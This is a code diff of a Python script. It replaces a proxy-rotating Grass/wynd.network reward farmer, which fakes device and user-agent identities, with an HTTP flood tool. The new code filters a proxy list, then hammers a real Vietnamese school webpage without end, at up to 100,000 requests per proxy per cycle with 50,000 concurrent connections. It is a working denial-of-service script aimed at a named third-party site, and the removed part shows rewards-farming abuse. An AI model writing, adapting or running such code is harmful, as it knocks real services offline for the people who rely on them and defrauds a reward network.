@@ -1,130 +1,94 @@
 import asyncio
-import random
-import ssl
-import json
-import time
-import uuid
-import requests
-import shutil
-from loguru import logger
-from websockets_proxy import Proxy, proxy_connect
-from fake_useragent import UserAgent
+import aiohttp
 
-async def connect_to_wss(socks5_proxy, user_id):
-    user_agent = UserAgent(os=['windows', 'macos', 'linux'], browsers='chrome')
-    random_user_agent = user_agent.random
-    device_id = str(uuid.uuid3(uuid.NAMESPACE_DNS, socks5_proxy))
-    logger.info(device_id)
-    while True:
-        try:
-            await asyncio.sleep(random.randint(1, 10) / 10)
-            custom_headers = {
-                "User-Agent": random_user_agent,
-            }
-            ssl_context = ssl.create_default_context()
-            ssl_context.check_hostname = False
-            ssl_context.verify_mode = ssl.CERT_NONE
-            urilist = ["wss://proxy2.wynd.network:4444/", "wss://proxy2.wynd.network:4650/"]
-            uri = random.choice(urilist)
-            server_hostname = "proxy2.wynd.network"
-            proxy = Proxy.from_url(socks5_proxy)
-            async with proxy_connect(uri, proxy=proxy, ssl=ssl_context, server_hostname=server_hostname,
-                                     extra_headers=custom_headers) as websocket:
-                async def send_ping():
-                    while True:
-                        send_message = json.dumps({
-                            "id": str(uuid.uuid4()), "version": "1.0.0", "action": "PING", "data": {}
-                        })
-                        logger.debug(send_message)
-                        await websocket.send(send_message)
-                        await asyncio.sleep(2)
+# ================== CONFIG ==================
+INPUT_FILE = "alive1.txt"      # initial list of proxies to test
+OUTPUT_FILE = "a.txt"          # alive proxies saved here
+TARGET_URL = "https://c3phucu.hungyen.edu.vn/tin-tuc/thoi-khoa-bieu-so-1-ca-chieu.html"
+TIMEOUT = 50
+CONNECTIONS_PER_PROXY = 100000   # hits per proxy per cycle
+MAX_CONCURRENT = 50000
+# ============================================
 
-                await asyncio.sleep(1)
-                asyncio.create_task(send_ping())
 
-                while True:
-                    response = await websocket.recv()
-                    message = json.loads(response)
-                    logger.info(message)
-                    if message.get("action") == "AUTH":
-                        auth_response = {
-                            "id": message["id"],
-                            "origin_action": "AUTH",
-                            "result": {
-                                "browser_id": device_id,
-                                "user_id": user_id,
-                                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-                                "timestamp": int(time.time()),
-                                "device_type": "desktop",
-                                "version": "4.30",
-                            }
-                        }
-                        logger.debug(auth_response)
-                        await websocket.send(json.dumps(auth_response))
+def make_proxy_url(proxy: str) -> str:
+    proxy = proxy.strip()
+    if proxy.startswith(("http://", "https://", "socks")):
+        return proxy
+    return f"http://{proxy}"
 
-                    elif message.get("action") == "PONG":
-                        pong_response = {"id": message["id"], "origin_action": "PONG"}
-                        logger.debug(pong_response)
-                        await websocket.send(json.dumps(pong_response))
-        except Exception as e:
-            proxy_to_remove = socks5_proxy
-            with open('auto_proxies.txt', 'r') as file:
-                lines = file.readlines()
-            updated_lines = [line for line in lines if line.strip() != proxy_to_remove]
-            with open('auto_proxies.txt', 'w') as file:
-                file.writelines(updated_lines)
-            #print(f"Proxy '{proxy_to_remove}' has been removed from the file.")
 
-def fetch_proxies():
-    """Fetches proxies from the API and saves them to 'auto_proxies.txt'."""
-    api_url = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text"
+async def check_proxy(session: aiohttp.ClientSession, proxy: str) -> str | None:
+    """Check if proxy works once"""
     try:
-        response = requests.get(api_url, stream=True)
-        if response.status_code == 200:
-            proxies = response.text.strip().splitlines()
-            if proxies:
-                with open('auto_proxies.txt', 'w') as f:
-                    f.writelines([proxy + '\n' for proxy in proxies])
-                print(f"Fetched and saved {len(proxies)} proxies to 'auto_proxies.txt'.")
+        async with session.get(TARGET_URL, proxy=make_proxy_url(proxy), timeout=TIMEOUT, ssl=False) as resp:
+            if resp.status == 200:
+                print(f"[+] WORKING: {proxy}")
+                return proxy
             else:
-                print("No proxies found from the API.")
-                return False
-        else:
-            print(f"Failed to fetch proxies. Status code: {response.status_code}")
-            return False
+                print(f"[-] DEAD: {proxy} (status {resp.status})")
+    except asyncio.TimeoutError:
+        print(f"[-] DEAD: {proxy} (timeout)")
+    except aiohttp.ClientProxyConnectionError:
+        print(f"[-] DEAD: {proxy} (proxy conn error)")
+    except aiohttp.ClientHttpProxyError:
+        print(f"[-] DEAD: {proxy} (http proxy error)")
+    except aiohttp.ClientSSLError:
+        print(f"[-] DEAD: {proxy} (SSL error)")
     except Exception as e:
-        print(f"Error fetching proxies: {e}")
-        return False
-    return True
+        print(f"[-] DEAD: {proxy} ({type(e).__name__})")
+    return None
+
+
+async def hammer_once(session: aiohttp.ClientSession, proxy: str):
+    """One request via proxy"""
+    try:
+        async with session.get(TARGET_URL, proxy=make_proxy_url(proxy), timeout=TIMEOUT, ssl=False) as resp:
+            print(f"[+] EXTRA HIT via {proxy} ({resp.status})")
+    except Exception as e:
+        print(f"[!] Extra hit failed for {proxy} ({type(e).__name__})")
+
+
+async def hammer_forever(alive: list[str]):
+    """Infinite hammer loop for saved alive proxies"""
+    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT)
+
+    async with aiohttp.ClientSession(connector=connector) as session:
+        while True:
+            tasks = []
+            for proxy in alive:
+                for _ in range(CONNECTIONS_PER_PROXY):
+                    tasks.append(hammer_once(session, proxy))
+
+            # Fire off all hammer requests this round
+            await asyncio.gather(*tasks)
+
 
 async def main():
-    try:
-        _user_id = "2p4GgmhEwvn4B8NPpwyxHnAbzjk"
-        if not _user_id:
-            return
-        print(f"User ID read from file: {_user_id}")
-    except FileNotFoundError:
-        print("Error: 'user_id.txt' file not found.")
-        return
+    # === First run: check proxies ===
+    with open(INPUT_FILE, "r", encoding="utf-8") as f:
+        proxies = [line.strip() for line in f if line.strip()]
 
-    # Fetch and save proxies to 'auto_proxies.txt'
-    if not fetch_proxies():
-        print("No proxies available. Exiting script.")
-        return
+    alive = []
+    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT)
 
-    try:
-        with open('auto_proxies.txt', 'r') as file:
-            auto_proxy_list = file.read().splitlines()
-            if not auto_proxy_list:
-                print("No proxies found in 'auto_proxies.txt'. Exiting script.")
-                return
-            print(f"Proxies read from file: {auto_proxy_list}")
-    except FileNotFoundError:
-        print("Error: 'auto_proxies.txt' file not found.")
-        return
+    async with aiohttp.ClientSession(connector=connector) as session:
+        tasks = [check_proxy(session, proxy) for proxy in proxies]
+        results = await asyncio.gather(*tasks)
+        alive = [p for p in results if p]
 
-    tasks = [asyncio.ensure_future(connect_to_wss(i, _user_id)) for i in auto_proxy_list]
-    await asyncio.gather(*tasks)
+    # Save alive proxies
+    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
+        f.write("\n".join(alive))
 
-if __name__ == '__main__':
+    print(f"\n[!] {len(alive)} alive proxies saved to {OUTPUT_FILE}")
+
+    # === After first check: hammer only ===
+    if alive:
+        await hammer_forever(alive)
+    else:
+        print("[!] No alive proxies found. Exiting.")
+
+
+if __name__ == "__main__":
     asyncio.run(main())
